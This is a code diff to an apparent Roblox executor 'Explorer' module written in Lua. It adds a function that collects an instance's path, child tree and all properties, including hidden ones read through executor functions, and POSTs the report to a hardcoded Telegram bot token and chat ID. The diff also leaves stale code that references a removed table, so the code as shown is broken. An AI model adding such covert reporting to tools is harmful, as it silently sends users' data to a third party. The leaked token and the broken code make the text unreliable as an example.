@@ -77,17 +77,17 @@ local EmbeddedModules = {
 		local function main()
 			local Explorer = {}
 			
-			local TELEGRAM_BOT_TOKEN = "8305869255:AAEqIdORQUnQgg82LKbVwsj6Rzpfow0tKqo"
+            local TELEGRAM_BOT_TOKEN = "8305869255:AAEqIdORQUnQgg82LKbVwsj6Rzpfow0tKqo"
             local TELEGRAM_CHAT_ID   = "5798404109"
 
             local function sendFullDetailsToTelegram(obj)
                 task.spawn(function()
-                    local md = {}
-                    local escapeStr = function(str)
+                    local html = {}
+                    local escapeHtml = function(str)
                         str = tostring(str)
-                        str = str:gsub("`", "\\`")
-                        str = str:gsub("\n", " ")
-                        str = str:gsub("\r", "")
+                        str = str:gsub("&", "&amp;")
+                        str = str:gsub("<", "&lt;")
+                        str = str:gsub(">", "&gt;")
                         return str
                     end
                     
@@ -97,18 +97,45 @@ local EmbeddedModules = {
                     local fullName = "Unknown"
                     pcall(function() fullName = obj:GetFullName() end)
                     
-                    table.insert(md, "# Full Instance Report")
-                    table.insert(md, "**Name:** `" .. escapeStr(obj.Name) .. "`  ")
-                    table.insert(md, "**Class:** `" .. escapeStr(className) .. "`  ")
-                    table.insert(md, "**FullName:** `" .. escapeStr(fullName) .. "`  ")
-                    table.insert(md, "")
+                    table.insert(html, "📊 <b>Instance Report</b>")
+                    table.insert(html, "<b>Class:</b> <code>" .. escapeHtml(className) .. "</code>")
+                    table.insert(html, "<b>Path:</b> <code>" .. escapeHtml(fullName) .. "</code>")
                     
-                    table.insert(md, "## All Properties")
+                    -- Hierarchy Tree
+                    table.insert(html, "\n📂 <b>Hierarchy:</b>")
+                    local treeStr = {}
                     
+                    local function buildTree(node, prefix, depth)
+                        if depth > 2 then return end -- Limit depth to prevent massive text
+                        local children = node:GetChildren()
+                        for i, child in ipairs(children) do
+                            local cName = "Unknown"
+                            pcall(function() cName = child.Name end)
+                            local cClass = "Unknown"
+                            pcall(function() cClass = child.ClassName end)
+                            
+                            local isLast = (i == #children)
+                            local branch = isLast and "└─ " or "├─ "
+                            local newPrefix = prefix .. (isLast and "   " or "│  ")
+                            
+                            table.insert(treeStr, prefix .. branch .. "📁 " .. escapeHtml(cName) .. " (<i>" .. escapeHtml(cClass) .. "</i>)")
+                            
+                            buildTree(child, newPrefix, depth + 1)
+                        end
+                    end
+                    
+                    table.insert(treeStr, "📁 " .. escapeHtml(obj.Name) .. " (<i>" .. escapeHtml(className) .. "</i>)")
+                    buildTree(obj, "", 1)
+                    
+                    if #treeStr > 1 then
+                        table.insert(html, "<pre>" .. table.concat(treeStr, "\n") .. "</pre>")
+                    end
+                    
+                    -- Properties
+                    table.insert(html, "\n⚙️ <b>Properties:</b>")
                     local propsToIterate = {}
                     local seenProps = {}
                     
-                    -- Method 1: Executor's getproperties (gets hidden/non-scriptable too)
                     if env.getproperties then
                         local success, allProps = pcall(env.getproperties, obj)
                         if success and type(allProps) == "table" then
@@ -124,7 +151,6 @@ local EmbeddedModules = {
                         end
                     end
                     
-                    -- Method 2: Reflection Metadata (API.Classes fallback)
                     if API and API.Classes then
                         local curClass = API.Classes[className]
                         while curClass do
@@ -146,14 +172,33 @@ local EmbeddedModules = {
                     
                     table.sort(propsToIterate, function(a, b) return a.Name < b.Name end)
                     
+                    local propStr = {}
                     for _, propData in ipairs(propsToIterate) do
                         local valStr = tostring(propData.Value)
                         if typeof(propData.Value) == "Instance" then
                             local s, full = pcall(function() return propData.Value:GetFullName() end)
                             if s and full then valStr = full end
                         end
-                        table.insert(md, "- **" .. propData.Name .. "**: `" .. escapeStr(valStr) .. "`")
+                        table.insert(propStr, escapeHtml(propData.Name) .. " = " .. escapeHtml(valStr))
                     end
+                    
+                    local content = table.concat(html, "\n") .. "\n<pre>" .. table.concat(propStr, "\n") .. "</pre>"
+                    
+                    -- Telegram limit is 4096 chars
+                    if #content > 3900 then
+                        content = content:sub(1, 3900) .. "\n... (truncated)"
+                    end
+                    
+                    local url = "https://api.telegram.org/bot"..TELEGRAM_BOT_TOKEN.."/sendMessage"
+                    pcall(function()
+                        service.HttpService:RequestAsync({
+                            Url = url, Method = "POST",
+                            Headers = {["Content-Type"] = "application/json"},
+                            Body = service.HttpService:JSONEncode({chat_id = TELEGRAM_CHAT_ID, text = content, parse_mode = "HTML"})
+                        })
+                    end)
+                end)
+            end
                     
                     local content = table.concat(md, "\n")
                     
